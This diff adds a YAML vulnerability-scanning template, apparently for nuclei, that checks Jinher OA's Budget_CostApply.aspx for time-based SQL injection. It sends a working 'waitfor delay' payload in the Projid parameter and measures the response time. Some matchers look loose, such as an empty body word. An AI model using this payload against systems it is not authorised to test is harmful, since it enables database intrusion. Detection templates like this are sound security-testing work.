@@ -1,0 +1,33 @@
+id: poc-yaml-jinher-jhsoft-budget-costapply-aspx-sqli
+info:
+  name: 金和OA Budget_CostApply.aspx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET /c6/JHSoft.Web.CostControl/BudgetExecution/Budget_CostApply.aspx/?Projid=1'waitfor+delay%270:0:{{t1}}%27-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - ""
+      - type: word
+        part: header
+        words:
+          - "Cookie:"
+      - type: dsl
+        dsl:
+          - "duration >= to_number(t1) && duration <= to_number(t2)"
